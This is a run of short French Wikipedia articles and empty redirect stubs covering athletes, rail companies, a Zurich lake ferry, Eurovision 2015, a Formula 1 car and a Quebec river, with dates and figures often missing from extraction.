En 2004, le VPE lance une première application web (MELINDA) pour permettre les commandes d'attribution de lignes via internet. En 2006, une nouvelle base de données (TAKT) est mise en service. Depuis 2007, le VPE n'accepte plus que les commandes d'attribution de lignes envoyées via son application web. Entre 2004 et 2007, le nombre de commandes traitées est passé de quelques centaines à près de 10.000 par mois.
Affiliation.
VPE est affilié, comme membre ou partenaire, à différents organismes ferroviaires, notamment : le RailNetEurope, l'Agence ferroviaire européenne, l'Union internationale des chemins de fer et la Communauté européenne du rail.

</doc>
<doc id="8728906" url="https://fr.wikipedia.org/wiki?curid=8728906" title="Terry Antonis">
Terry Antonis

Terry Antonis, né le à Sydney en Australie, est un footballeur international australien. Il joue au poste de milieu de terrain.
Biographie.
Carrière internationale.
Il est retenu par Ange Postecoglou pour disputer la Coupe d'Asie de 2015 qui se déroule en Australie. 
Il compte 3 sélections pour 0 but en équipe d'Australie depuis 2012.

</doc>
<doc id="8728918" url="https://fr.wikipedia.org/wiki?curid=8728918" title="MÁV Cargo Zrt">
MÁV Cargo Zrt



</doc>
<doc id="8728920" url="https://fr.wikipedia.org/wiki?curid=8728920" title="MÁV Start Zrt">
MÁV Start Zrt



</doc>
<doc id="8728925" url="https://fr.wikipedia.org/wiki?curid=8728925" title="Tim Frazier">
Tim Frazier

Tim Frazier, né le à Houston au Texas, est un joueur américain de basket-ball évoluant au poste de meneur. Il mesure 1,82 m.
Biographie.
Frazier est licencié par les Pistons de Détroit en .
Le , il s'engage avec les Grizzlies de Memphis pour un contrat de dix jours. Le , il signe à nouveau un contrat de dix jours en faveur des Grizzlies de Memphis. Le , il est conservé jusqu'à la fin de la saison.
Le , il signe pour dix jours en faveur du Magic d'Orlando.
Frazier quitte les États-Unis pour la première fois à l'été 2022 pour l'AEK Athènes. En , Frazier rejoint jusqu'à la fin de la saison la SIG Strasbourg, dans le championnat de France, pour pallier l'absence sur blessure de Jean-Baptiste Maille.
En , Frazier revient en championnat de France et s'engage avec les Metropolitans 92, derniers de première division.
Records sur une rencontre en NBA.
Les records personnels de Tim Frazier en NBA sont les suivants :
"Dernière mise à jour : "

</doc>
<doc id="8728926" url="https://fr.wikipedia.org/wiki?curid=8728926" title="Charles Anderson Worsley">
Charles Anderson Worsley



</doc>
<doc id="8728927" url="https://fr.wikipedia.org/wiki?curid=8728927" title="Charles Worsley">
Charles Worsley



</doc>
<doc id="8728928" url="https://fr.wikipedia.org/wiki?curid=8728928" title="MÁV Cargo">
MÁV Cargo



</doc>
<doc id="8728932" url="https://fr.wikipedia.org/wiki?curid=8728932" title="MÁV-START">
MÁV-START



</doc>
<doc id="8728936" url="https://fr.wikipedia.org/wiki?curid=8728936" title="Direction centrale de la police judiciaire (France)">
Direction centrale de la police judiciaire (France)



</doc>
<doc id="8728963" url="https://fr.wikipedia.org/wiki?curid=8728963" title="Station de transmission de base">
Station de transmission de base



</doc>
<doc id="8728976" url="https://fr.wikipedia.org/wiki?curid=8728976" title="Richard d'Ilchester">
Richard d'Ilchester

Richard d'Ilchester est évêque de Winchester de 1174 à sa mort, en 1188.
Biographie.
Désigné en 1162-1163 archidiacre de Poitiers, il passe la plupart de son temps en Angleterre. 
Il succède à Henri de Blois au siège épiscopal de Winchester. Élu le , il est consacré en octobre 1174 à Canterbury.
Il meurt le .

</doc>
<doc id="8728981" url="https://fr.wikipedia.org/wiki?curid=8728981" title="Natik Hashim">
Natik Hashim

Natik Hashim Abidoun () (né le à Bagdad en Irak et mort le à Mascate à Oman) est un footballeur international irakien, qui évoluait au poste de défenseur.
Biographie.
Carrière en sélection.
Avec l'équipe d'Irak, il figure dans le groupe des sélectionnés lors de la coupe du monde de 1986.
Il a également participé aux JO de 1984 et de 1988.

</doc>
<doc id="8728982" url="https://fr.wikipedia.org/wiki?curid=8728982" title="Brian Qvale">
Brian Qvale

Brian Arthur Qvale, né le à Williston au Dakota du Nord, est un joueur américain de basket-ball.

</doc>
<doc id="8728983" url="https://fr.wikipedia.org/wiki?curid=8728983" title="Arneštovice">
Arneštovice

Arneštovice est une commune du district de Pelhřimov, dans la région de Vysočina, en République tchèque. Sa population s'élevait à habitants en 2020.
Géographie.
Arneštovice est situé dans une vallée sur la rive gauche de la Trnava, un affluent de la Želivka, dans les monts de Bohême-Moravie. Le village est bordé au nord par les collines Vystrkov () et Radějov ().
Arneštovice se trouve à au nord-ouest de Pelhřimov, à au nord-ouest de Jihlava et à au sud-est de Prague.
La commune est limitée par Košetice au nord, par Křelovice à l'est, par Rovná et Hořepník au sud, et par Buřenice à l'ouest.
Histoire.
La première mention écrite du village date de 1403.
Transports.
Par la route, Arneštovice se trouve à de Pelhřimov, à de Jihlava et à de Prague.

</doc>
<doc id="8728990" url="https://fr.wikipedia.org/wiki?curid=8728990" title="Portugal au Concours Eurovision de la chanson 2015">
Portugal au Concours Eurovision de la chanson 2015

Le Portugal a annoncé le sa participation au Concours Eurovision de la chanson 2015 à Vienne, en Autriche.
Leonor Andrade, la représentante du Portugal au Concours Eurovision de la chanson est annoncée à la suite de la finale nationale Festival da Canção 2015.
Festival da Canção 2015.
RTP a annoncé le , que 12 compositeurs nationaux ont été invités à composer pour le Festival da Canção 2015.
Le , RTP annonce que le Festival da Canção 2015 sera composé de deux demi-finales composées chacune de 6 chansons, d'une finale de 6 chansons et d'une Grande Finale composée de 3 chansons. Les artistes seront accompagnés d'un orchestre.
Le , durant une conférence de presse, RTP annonce que le "Festival da Canção 2015" sera présenté par un duo par soirée : pour la première demi-finale Jorge Gabriel et Joana Teles, pour la deuxième demi-finale José Carlos Malato et Sílvia Alberto et Catarina Furtado et Júlio Isidro pour la finale&lt;ref name="escportugal.pt/2015/02"&gt;&lt;/ref&gt;.
Sont également annoncés les artistes ainsi que leurs chansons. Toutes sans exception sont en portugais.
Participants.
12 chansons seront en compétition.
Anciens participants à l'Eurovision.
On notera le retour de Simone de Oliveira et de Adelaide Ferreira parmi les 12 interprètes en compétition.
Première demi-finale.
La première demi-finale sera présentée par Jorge Gabriel et Joana Teles.
3 des six chansons se qualifieront pour la finale.
Les deux premières chansons qualifiées pour la finale seront sélectionnées par le télévote tandis que la troisième chanson sera sélectionnée par un jury de professionnels composé des 6 compositeurs des chansons de cette demi-finale. Il sera impossible pour les compositeurs de voter pour leur propre œuvre.
Deuxième demi-finale.
La deuxième demi-finale sera présentée par José Carlos Malato et Sílvia Alberto.
Comme lors de la première demi-finale, 3 des six chansons se qualifieront pour la finale avec les deux premières chansons qualifiées pour la finale choisies par le télévote tandis que la troisième chanson elle sera sélectionnée par les 6 compositeurs des chansons de cette semi-finale. Il sera impossible pour les compositeurs de voter pour leur propre œuvre.
Finale.
La finale sera présentée par Catarina Furtado et Júlio Isidro.
Une fois encore, trois chansons de la finale accéderont au stade de la Grande Finale, sur un plan de sélection identique à celui des demi-finales.
Grande Finale.
Lors de la Grande Finale, les trois dernières chansons en lisse seront soumises au télévote et à l'issue de celui-ci sera annoncé(e) le ou la représentant(e) du Portugal au Concours Eurovision de la chanson 2015 à Vienne, en Autriche.
À l'Eurovision.
Le Portugal participa à la seconde demi-finale, le . Arrivé avec 19 points, le pays ne se qualifia pas pour la finale.

</doc>
<doc id="8728992" url="https://fr.wikipedia.org/wiki?curid=8728992" title="Zürichsee-Fähre Horgen-Meilen">
Zürichsee-Fähre Horgen-Meilen

La (FHM) (en français : "Bac Horgen-Meilen sur le lac de Zurich SA") est une société anonyme suisse qui exploite un bac (ou ferry) sur le lac de Zurich entre Horgen et Meilen. Les bateaux assurent le transport de personnes et de véhicules durant toute l'année.
Exploitation.
Les ferrys circulent de 6 heures à 22 heures toutes les , et toutes les 6 ou 7,5 minutes aux heures de pointe. Ils raccourcissent le trajet pour les transports individuels entre l'Oberland zurichois et la Suisse centrale, sans faire le détour par la digue entre Rapperswil et Pfäffikon (environ par le Sud), ou par la ville de Zurich (environ par le Nord). La durée du trajet est d'environ pour . 
Une grande partie des trajets concerne les pendulaires. Les cinq ferrys ont transporté en 2013 plus de 2 millions de personnes et plus de 1,3 million de véhicules (précisément  personnes, véhicules jusqu'à , véhicules de plus de ,  deux-roues et remorques pour un total de courses).
Historique.
La "" a été fondée le à Meilen. Les 54 actionnaires ont alors réuni un capital de départ de . Les actions de cette compagnie, de navigation de Suisse, ne sont pas cotées en bourse.
Après quelques difficultés techniques de départ, le premier ferry "Schwan" a commencé son service le avec un rythme à la demi-heure.
De 1942 à 1946, l'exploitation a été interrompue à cause de la Seconde Guerre mondiale. Dès l'été 1946 le ferry reprend ses courses au rythme d'une par heure. Puis la demande a continuellement augmenté jusqu'en 1968, à tel point que les aller-retour se sont succédé sans interruptions.
En 1969, le nouveau "Schwan" remplace le vétéran de 1932. Dès 1975 et avec l'acquisition de nouveaux bateaux, le rythme est constamment augmenté pour atteindre en 2003 le rythme actuel d'une course toutes les aux heures de pointe.
En 2015, la compagnie "" est citée en exemple pour un éventuel ferry sur le lac Léman, au large de la ville de Genève.
Flotte.
La compagnie possède cinq ferrys amphidromes, construits par à Kressbronn en Allemagne.
Grâce à leur propulseurs Voith Schneider (deux propulseurs dans l'axe longitudinal), les ferrys sont très maniables, capables de tourner sur place, et leur distance de freinage est extrêmement courte (environ , une fois et demie la longueur du bateau).
Les ferrys sont de type "Roll-On, Roll-Off", avec des rampes d'accès de part et d'autre ; ils sont donc amphidromes.

</doc>
<doc id="8729006" url="https://fr.wikipedia.org/wiki?curid=8729006" title="Giovanni Borsotti">
Giovanni Borsotti

Giovanni Borsotti, né le à Briançon (France), est un skieur alpin italien. Sa sœur Camilla est aussi une skieuse alpine de haut niveau.
Biographie.
Giovanni Borsotti participe à ses premières courses FIS en 2005. Il fait ses débuts en Coupe d'Europe en 2007 puis en Coupe du monde en 2009. En 2009, il remporte aussi une médaille aux Championnats du monde junior, en bronze lors du combiné. En 2010, il gagne sa première épreuve de Coupe d'Europe, un slalom géant à Trysil et marque ses premiers points en Coupe du monde. En 2011, il est sélectionné pour ses premiers Championnats du monde à Garmisch-Partenkirchen où il se classe en slalom géant, avant de gagner son premier titre national sur le super G.

</doc>
<doc id="8729007" url="https://fr.wikipedia.org/wiki?curid=8729007" title="Karim Allawi">
Karim Allawi

Karim Mohammed Allawi () (né le en Irak) est un footballeur international irakien, qui évoluait au poste de défenseur.
Son frère, Khalil, était également footballeur.
Biographie.
Carrière en sélection.
Avec l'équipe d'Irak, il a joué 90 matchs entre 1981 et 1990. Il figure dans le groupe des sélectionnés lors de la coupe du monde de 1986.
Il a également participé aux JO de 1984 et de 1988.

</doc>
<doc id="8729008" url="https://fr.wikipedia.org/wiki?curid=8729008" title="Liste des agglomérations de l'Europe">
Liste des agglomérations de l'Europe



</doc>
<doc id="8729010" url="https://fr.wikipedia.org/wiki?curid=8729010" title="Grand maître de la Légion d'honneur">
Grand maître de la Légion d'honneur



</doc>
<doc id="8729011" url="https://fr.wikipedia.org/wiki?curid=8729011" title="Sauber C34">
Sauber C34

La Sauber C34 est la monoplace de Formule 1 engagée par l'écurie suisse Sauber dans le cadre du championnat du monde de Formule 1 2015. Elle est pilotée par le Suédois Marcus Ericsson, en provenance de l'écurie malaisienne Caterham F1 Team et par le Brésilien Felipe Nasr, auteur de trois saisons en GP2 Series. Le pilote essayeur est l'Italien Raffaele Marciello. Conçue par l'ingénieur Français Éric Gandelin, la C34 est présentée le à l'usine d'Hinwil en Suisse. Évolution de la Sauber C33 de 2014, qui a réalisé la pire saison de l'écurie depuis son engagement en 1993, la C34 se distingue par son poids, augmenté de onze kilogrammes.
Création de la monoplace.
Après une saison 2014 difficile pour Sauber, l'écurie suisse décide de changer son duo de pilotes. L'arrivée de Felipe Nasr permet la signature d'un contrat avec la banque brésilienne Banco do Brasil, entraînant un changement de livrée radical. En effet, la couleur presque exclusivement noire de la monoplace est remplacée par une livrée bleue et jaune. Outre le plan sportif, l'avenir de l'écurie s'est révélé incertain durant l'intersaison, au point que le développement de la C34 a été interrompu et que le moteur Ferrari, qui propulse la monoplace, n'a été livré que le , soit une semaine avant les premiers essais privés sur le circuit permanent de Jerez, en Espagne.
Sauber annonce également un partenariat avec la société américaine spécialiste en informatique Hewlett-Packard, permettant à l'écurie de travailler en collaboration avec le basé à Grenoble, afin d'améliorer les connaissances de l'équipe en termes de dynamiques des fluides (CFD). De plus, la firme américaine a installé dans la soufflerie d'Hinwil un ordinateur servant à améliorer le traitement des données.
La C34 se distingue de sa devancière, la Sauber C33, par un museau plus volumineux et plus bas, en accord avec la réglementation. Selon le directeur technique de l'écurie, Éric Gandelin, l'équilibre général et le comportement de la voiture dans les virages lents, principaux points faibles de la C33, ont été améliorés, tandis que les pontons latéraux ont été affinés. Selon Monishia Kalterborn, la directrice de l'écurie, l'objectif de Sauber est de après une saison vierge.

</doc>
<doc id="8729024" url="https://fr.wikipedia.org/wiki?curid=8729024" title="Ismail Mohammed">
Ismail Mohammed

Ismail Mohammed Sharif () (né le en Irak) est un joueur de football international irakien, qui évoluait au poste de milieu de terrain.
Biographie.
Carrière en sélection.
Avec l'équipe d'Irak, il figure dans le groupe des sélectionnés lors de la coupe du monde de 1986.
Il a également participé aux JO de 1988.

</doc>
<doc id="8729025" url="https://fr.wikipedia.org/wiki?curid=8729025" title="Flute Fraternity">
Flute Fraternity

Flute Fraternity est un album de jazz West Coast des flûtistes, saxophonistes et clarinettistes Herbie Mann et Buddy Collette. 
Enregistrement.
Musiciens.
La session d'enregistrement est interprétée par un quintet composé de:

</doc>
<doc id="8729039" url="https://fr.wikipedia.org/wiki?curid=8729039" title="Nyoshul Khen Rinpoché">
Nyoshul Khen Rinpoché



</doc>
<doc id="8729040" url="https://fr.wikipedia.org/wiki?curid=8729040" title="Jerome Dyson">
Jerome Dyson

Jerome Clifton Dyson, né le à Rockville au Maryland, est un joueur américain de basket-ball.

</doc>
<doc id="8729049" url="https://fr.wikipedia.org/wiki?curid=8729049" title="Union Handballclub Salzburg">
Union Handballclub Salzburg

L’UHC Salzburg est un club de handball qui se situe à Salzbourg en Autriche. 

</doc>
<doc id="8729050" url="https://fr.wikipedia.org/wiki?curid=8729050" title="Rémi Pelletier-Roy">
Rémi Pelletier-Roy

Rémi Pelletier-Roy (né le à Longueuil au Québec) est un coureur cycliste canadien.
Biographie.
Jeunesse et débuts dans le cyclisme.
C’est d'abord en ski alpin que Rémi s'initie au sport de compétition. Ayant pris part à plusieurs courses sur le circuit de la Fédération Internationale de ski alpin (FIS), il met un terme à sa carrière sportive pour se consacrer à ses études collégiales puisqu'il veut être admis en médecine. Par contre, la passion pour le sport a vite fait de le retrouver pour une nouvelle discipline, le cyclisme. 
Après son entrée sur l'équipe du Québec à sa toute première saison sur route à 18 ans (2008), et étant officiellement membre de l'équipe canadienne dès sa deuxième saison à 19 ans (2009), Rémi décide d'explorer son potentiel dans cette nouvelle discipline. 
Carrière professionnelle.
En 2010, Louis Garneau le remarque et l'intègre à son équipe Garneau-Club Chaussures-Norton Rose qui deviendra professionnelle en 2013 sous le nom de Garneau-Québecor. C'est aux côtés d'Antoine Duchesne que Rémi fait ses débuts sur le circuit professionnel de vélo de route, tout en étant membre de l'équipe canadienne de vélo sur piste. Même si son équipe se consacre uniquement à la route, Louis Garneau lui permet d'être sur l'équipe canadienne de vélo sur piste en même temps et lui promet de le supporter jusqu'à ce qu'il atteigne son rêve d'aller aux Jeux olympiques de Rio, comme lui l'a fait en 1984.
En 2014, Rémi Pelletier-Roy remporte une médaille de bronze lors de l'épreuve de scratch aux Jeux du Commonwealth de Glasgow, ce qui est à ce jour sa plus grande performance dans une compétition internationale. Peu après, il obtient le bronze lors des championnats panaméricains sur l'épreuve de l'omnium. Autres éléments notables en 2014, il bat la marque canadienne autant à l'épreuve de poursuite individuelle que par équipes. Il se voit ainsi double recordman canadien à ces épreuves.
En 2015, il remporte la médaille de bronze dans l'épreuve de poursuite par équipes aux Jeux panaméricains de Toronto. Il continue sur sa lancée lors des championnats panaméricains du Chili en récoltant la médaille de bronze à l'omnium ainsi que la médaille d'argent à l'épreuve de poursuite par équipes. En octobre dernier, Rémi ajoute à son palmarès trois titres de champion du Canada sur piste. Il est présentement au huitième rang du classement mondial en cyclisme sur piste (UCI) de l'Omnium, sa discipline de prédilection. 
Depuis le début de sa carrière, c'est plus de 49 podiums, dont 32 victoires sur des courses provinciales, nationales et internationales que Rémi a cumulées. Depuis 2012, il a à son actif dix titres de Champion du Canada sur piste, dont trois sur l'année 2015. 
Ses objectifs sportifs à court et moyen terme sont de faire un top 10 sur une épreuve de la coupe du monde de cyclisme sur piste 2015-2016, de se sélectionner pour les championnats du monde de cyclisme sur piste 2016 et de conclure avec une sélection olympique pour les Jeux olympiques de 2016.
Études.
Parallèlement à sa carrière sportive, Rémi est étudiant en de médecine à l'Université Laval et il souhaite poursuivre sa spécialité en chirurgie orthopédique.

</doc>
<doc id="8729053" url="https://fr.wikipedia.org/wiki?curid=8729053" title="Retour à Nazareth">
Retour à Nazareth

Le retour à Nazareth est un épisode faisant partie de la version donnée par l'Évangile de Luc sur le début de la vie de Jésus. Il décrit le retour de Joseph et Marie chez eux à Nazareth après que Jésus est né lors de leur venue à Bethléem pour s'inscrire au recensement de Quirinius.
Le compte rendu de cet épisode est différent dans l'Évangile selon Matthieu, où il est dit que Joseph et sa famille vivent à Bethléem et ne se rendent à Nazareth qu'après la fuite en Égypte.

</doc>
<doc id="8729057" url="https://fr.wikipedia.org/wiki?curid=8729057" title="Retour de la famille de Jésus à Nazareth">
Retour de la famille de Jésus à Nazareth



</doc>
<doc id="8729058" url="https://fr.wikipedia.org/wiki?curid=8729058" title="Retour du jeune Jésus à Nazareth">
Retour du jeune Jésus à Nazareth



</doc>
<doc id="8729060" url="https://fr.wikipedia.org/wiki?curid=8729060" title="Michel Rouquette">
Michel Rouquette

Michel Rouquette, né le  à Magenta (Marne), est un footballeur puis entraîneur français. Il évolue au poste d'attaquant de la fin des années 1960 à la fin des années 1980. et se reconvertit en entraîneur à partir de cette période et exerce cela jusqu'au milieu des années 2000.
Formé au RC Épernay, il évolue ensuite à l'AS Saint-Étienne, avec qui il est champion de France en 1974, avant de rejoindre l'AS Monaco où il remporte un nouveau titre de champion en 1978. Il termine sa carrière professionnelle au FC Martigues.
Devenu entraîneur, il dirige notamment le Red Star 93 et Al-Gharafa SC.
Biographie.
Michel Rouquette joue 77 matchs en Division 1 ainsi que 103 matchs en Division 2.

</doc>
<doc id="8729061" url="https://fr.wikipedia.org/wiki?curid=8729061" title="Liste des participants au Synode des évêques sur la famille">
Liste des participants au Synode des évêques sur la famille



</doc>
<doc id="8729063" url="https://fr.wikipedia.org/wiki?curid=8729063" title="Communauté du Lautrécois et du Pays d'Agout">
Communauté du Lautrécois et du Pays d'Agout



</doc>
<doc id="8729072" url="https://fr.wikipedia.org/wiki?curid=8729072" title="Marillyn Hewson">
Marillyn Hewson

Marillyn A. Hewson, née le à Junction City, est une femme d'affaires et cheffe d'entreprise américaine. Elle est la présidente-directrice générale de Lockheed Martin depuis .
Biographie.
Formation.
Marillyn Hewson est diplômée d'un Bachelor of Science en gestion et d'un Master of Arts en économie de l'Université de l'Alabama. Elle possède aussi un diplôme de la Columbia Business School et d'Harvard . 
Carrière.
Après ses études, Marillyn Hewson intègre la société d'armement Lockheed Martin en 1983 et y occupe une succession de postes à responsabilité, en particulier celui de présidente - directrice des opérations et celui de vice-présidente pour le pôle "systèmes électroniques" (2010).
En , Marillyn Hewson est nommée au comité de direction Lockheed Martin. Elle en devient la présidente-directrice générale en . 
Autres mandats.
En , Marillyn Hewson est nommée membre du conseil présidentiel relatif à l’Exportation par le président Barack Obama.
Vie personnelle.
Marillyn Hewson est mariée à James R. Hewson et vit à McLean, en Virginie, depuis 2020. Le couple s’est rencontré alors qu’ils étaient étudiants à l’Université de l’Alabama. Ils ont deux fils.
Distinction.
En 2014, elle est considérée comme la la plus puissante au monde par le magazine "Forbes". En 2018, elle est classée neuvième et en 2019 dixième.

</doc>
<doc id="8729077" url="https://fr.wikipedia.org/wiki?curid=8729077" title="Camilla Borsotti">
Camilla Borsotti

Camilla Borsotti, née le à Lanzo Torinese, est une skieuse alpine italienne spécialiste des épreuves de vitesse (descente et super G). Son frère Giovanni est aussi un skieur alpin de haut niveau.
Biographie.
Camilla Borsotti commence sa carrière au niveau international lors de l'hiver 2004-2005 en Coupe d'Europe puis en Coupe du monde la saison suivante au slalom géant de Linz. En 2006, elle signe le premier résultat important de sa carrière en remportant une médaille aux Championnats du monde junior, l'argent lors du super G. En , elle termine septième d'un super combiné de Coupe du monde en Autriche, résultat qu'lle égalera en à Tarvisio. En 2014, elle comptait deux titres de championne d'Italie à son actif.
Elle termine sa carrière sportive en 2016.

</doc>
<doc id="8729096" url="https://fr.wikipedia.org/wiki?curid=8729096" title="St. Petersburg Bowl 2014">
St. Petersburg Bowl 2014

Le St. Petersburg Bowl 2014 fut un match annuel de football américain de niveau universitaire joué après la saison régulière de 2014, le au Tropicana Field de St. Petersburg en Floride.
Il s'agissait de la du St. Petersburg Bowl, succédant au Beef 'O' Brady's Bowl 2013.
Le match a mis en présence l'équipe des Wolfpack de North Carolina State issue de l'ACC à l'équipe des Knights d'UCF issue de l'AAC.
Il a débuté à 08:07 pm (heure locale) et a été retransmis en télévision sur ESPN.
Sponsorisé par la société BitPay spécialisée dans les processeurs de paiement en ligne, le match fut officiellement dénommé le Bitcoin St. Petersburg Bowl.
Les Wolfpack de North Carolina State gagnent le match sur le score de 34 à 27.
Présentation du match.
Le match met en présence l'équipe de North Carolina State issue de l'ACC à l'équipe d'UCF issue de l'AAC.
Il s'agit de la entre ces deux équipes, la dernière rencontre ayant eu lieu en 2010. Les deux équipes ont gagné un match.
North Carolina State.
Avec un bilan global de 7 victoires et 5 défaites, North Carolina State est éligible et accepte l'invitation pour participer au St. Petersburgh Bowl de 2014.
Ils terminent la saison régulière, de la division Atlantic de l'ACC derrière #5 Florida State, #15 Clemson, #24 Louisville et Boston College, avec un bilan en conférence de 3 victoires et 5 défaites.
Il s'agit de leur première participation au St. Petersburg Bowl.
UCF.
Avec un bilan global de 9 victoires et 3 défaites, UCF est éligible et accepte l'invitation pour participer au St. Petersburgh Bowl de 2014.
Ils terminent de l'AAC derrière #25 Memphis et Cincinnati, avec un bilan en conférence de 7 victoires et 1 défaite.
Il s'agit de leur au St. Petersburg Bowl (ils détiennent le record de participation).
Ils avaient perdu le St. Petersburg Bowl 2009 45 à 24 contre les Scarlet Knights de Rutgers mais gagné celui de 2012, 38 à 17 contre les Cardinals de Ball State.
Résumé du match.
Début du match: 8:07 pm (heure locale). Fin du match: 11:48 pm. Durée totale du match: 3:41.
Températures: de , vent de NE force de 10 km/h, ciel nuageux.

</doc>
<doc id="8729097" url="https://fr.wikipedia.org/wiki?curid=8729097" title="Levski-Spartak Sofia (handball)">
Levski-Spartak Sofia (handball)

Le Levski-Spartak Sofia est un club de handball qui se situe à Sofia en Bulgarie. 

</doc>
<doc id="8729102" url="https://fr.wikipedia.org/wiki?curid=8729102" title="Ismaël Nshutiyamagara">
Ismaël Nshutiyamagara

Ismaêl Nshutiyamagara, né le , est un footballeur rwandais évoluant actuellement au poste de défenseur central à l'APR FC.

</doc>
<doc id="8729109" url="https://fr.wikipedia.org/wiki?curid=8729109" title="Ziapelta">
Ziapelta

Ziapelta est un genre fossile de dinosaures ornithischiens de la famille des ankylosauridés. Il vivait au Campanien, âge du Crétacé supérieur, dans ce qui est maintenant le Nouveau-Mexique. Le genre comporte une unique espèce, "Ziapelta sanjuanensis".

</doc>
<doc id="8729113" url="https://fr.wikipedia.org/wiki?curid=8729113" title="Jerai Grant">
Jerai Grant

Harvey Jerai Grant, né le à Bowie au Maryland, est un joueur américain de basket-ball. C'est le fils de Harvey Grant et le grand frère de Jerami Grant et Jerian Grant.
Biographie.
En , il signe en Israël à l'Hapoël Holon.
Le , il signe en Lettonie au BK Ventspils. Le , il prolonge son contrat avec le club letton.
Le , il part en Lituanie où il signe au Klaipėdos Neptūnas. Le , il prolonge son contrat avec le club lituanien.
Le , il part en Italie où il signe au Basket Ravenne PM.
Le , il signe avec les Trotamundos de Carabobo au Vénézuéla.
Le , il signe en France à la SIG Strasbourg. En 2020, il s'engage avec le club grec de l'AEK Athènes.

</doc>
<doc id="8729116" url="https://fr.wikipedia.org/wiki?curid=8729116" title="RoboCop versus The Terminator">
RoboCop versus The Terminator

 est une mini-série de bande-dessinée en 4 tomes mélangeant l'univers de science-fiction "RoboCop" à celui de "Terminator", écrit par Frank Miller et dessinée par Walter Simonson, publiée aux États-Unis par Dark Horse Comics en 1992. La mini-série a été réimprimée en un seul tome de 128 pages en .
Synopsis.
Venant du futur, une femme apparaît soudain dans un halo lumineux à Détroit. Sa mission est simple : elle doit se débarrasser de RoboCop, qui serait selon elle le premier « chaînon » qui amènera plus tard Skynet à créer les Terminators. Mais elle n'est pas la seule à venir du futur...

</doc>
<doc id="8729122" url="https://fr.wikipedia.org/wiki?curid=8729122" title="Ghanim Oraibi">
Ghanim Oraibi

Ghanim Oraibi Jassim Al Roubai () (né le à Bagdad en Irak) est un footballeur international irakien, qui évoluait au poste de défenseur.
Biographie.
Carrière en sélection.
Avec l'équipe d'Irak, il joue 60 matchs entre 1985 et 1989. 
Il figure dans le groupe des sélectionnés lors de la coupe du monde de 1986. Lors du mondial, il joue trois matchs : contre le Paraguay, la Belgique et enfin le Mexique.
Il participe également aux JO de 1988.

</doc>
<doc id="8729123" url="https://fr.wikipedia.org/wiki?curid=8729123" title="Jerai grant">
Jerai grant



</doc>
<doc id="8729126" url="https://fr.wikipedia.org/wiki?curid=8729126" title="Kaliště">
Kaliště

Kaliště est un toponyme qui peut désigner :

</doc>
<doc id="8729127" url="https://fr.wikipedia.org/wiki?curid=8729127" title="KS Spójnia Gdańsk">
KS Spójnia Gdańsk

Le KS Spójnia Gdańsk est un club de handball qui se situe à Gdańsk en Pologne. 

</doc>
<doc id="8729131" url="https://fr.wikipedia.org/wiki?curid=8729131" title="Les Grandes Questions">
Les Grandes Questions

Les Grandes Questions est une émission de télévision française de débat animée par Franz-Olivier Giesbert et diffusée sur France 5 de 2011 à 2015. L'émission compte 4 saisons. 
Concept de l'émission.
Chaque semaine, Franz-Olivier Giesbert, entouré de Mazarine Pingeot, Géraldine Muhlmann et Éliette Abécassis, aborde un sujet de société avec les intervenants.

</doc>
<doc id="8729135" url="https://fr.wikipedia.org/wiki?curid=8729135" title="KS Spojnia Gdansk">
KS Spojnia Gdansk



</doc>
<doc id="8729136" url="https://fr.wikipedia.org/wiki?curid=8729136" title="Paul Bouré">
Paul Bouré

Paul Bouré ou Paul-Joseph Bouré, né le et décédé le , est un sculpteur belge. Promis à un brillant avenir, il meurt précocement à l'âge de vingt-cinq ans.
Biographie.
Paul-Joseph Bouré est né le 2 juillet 1823. Il est le fils de Jean-Guillaume Bouré, marchand, et d'Adelaïde Mousson. Il est le frère aîné d'Antoine Félix Bouré, sculpteur.
Élève de Louis-Eugène Simonis et de Guillaume Geefs, il se perfectionne ensuite à Florence dans l'atelier d'Aristodemo Costoli. Il y remporte un premier prix de composition en bas-relief au concours de l'Académie Saint-Luc de Florence.
Au Salon de Bruxelles de 1845, où il a envoyé "Un jeune Faune couché", "Un Amour" et "Prométhée exposé sur le Caucase à être dévoré par les vautours", Paul Bouré obtient une médaille de vermeil.
Annexes.
Bibliographie.
Arto, "Dictionnaire", "Bouré, Paul Joseph".

</doc>
<doc id="8729143" url="https://fr.wikipedia.org/wiki?curid=8729143" title="Rivière du Sourd">
Rivière du Sourd

La rivière du Sourd est un cours d'eau de la municipalité de Notre-Dame-du-Laus, dans la municipalité régionale de comté (MRC) de Antoine-Labelle, dans la région administrative des Laurentides, au Québec, au Canada.
Le lac du Sourd est compris dans la réserve faunique de Papineau-Labelle.
Géographie.
La rivière du Sourd coule entièrement dans la MRC Antoine-Labelle. Sur son parcours, la rivière traverse le lac du Sourd du nord au sud. 
Après un parcours d'environ 35 km vers le sud-ouest, la rivière du se décharge dans la rivière du Lièvre à la hauteur du Pont Lajeunesse à Notre-Dame-du-Laus, soit à environ 70 km au nord de Hull. Un secteur résidentiel de la municipalité de Notre-Dame-du-Laus porte le nom de Rivière-du-Sourd.
Toponymie.
Originellement, la rivière était désignée « Rivière aux Ours ». L'origine du toponyme rivière du Sourd et du lac du Sourd provient d'un individu affligé d'une surdité qui avait établi son domicile à proximité de la rivière du Sourd vers la fin du . Avant 1932 où cette appellation a été officialisée, la population du secteur utilisait couramment les doubles toponymes : Rivière aux Ours et Rivière du Sourd.
Le toponyme rivière du sourd a été officialisé le à la Banque des noms de lieux de la Commission de toponymie du Québec.

</doc>
<doc id="8729144" url="https://fr.wikipedia.org/wiki?curid=8729144" title="Liste des fiefs de Paris">
Liste des fiefs de Paris



</doc>
<doc id="8729146" url="https://fr.wikipedia.org/wiki?curid=8729146" title="Engrenage (collection)">
Engrenage (collection)

Engrenage est une collection de littérature policière fondée en 1979 par Alex Varoux aux éditions Jean Goujon.
Historique.
Cette collection est créée en pleine tendance néo-polar. La publicité de lancement l'affirme clairement .
En 1981, la collection est rachetée par le Fleuve noir. Caroline Camara rejoint Alex Varoux à sa direction. La numérotation continue à partir du numéro 33 mais la maquette est modifiée. En 1982, François Guérif s'associe à l'équipe directoriale pour fonder Engrenage international. La numérotation entre Engrenage et Engrenage international n'est pas distincte, seule la mention marque la différence pour les vingt-rois romans concernés. Il s'agit d’une seule collection.
En 1986, après la publication de cent trente-trois romans, la collection s’arrête.

</doc>
<doc id="8729150" url="https://fr.wikipedia.org/wiki?curid=8729150" title="Tournoi de tennis de Zagreb (ATP 2015)">
Tournoi de tennis de Zagreb (ATP 2015)

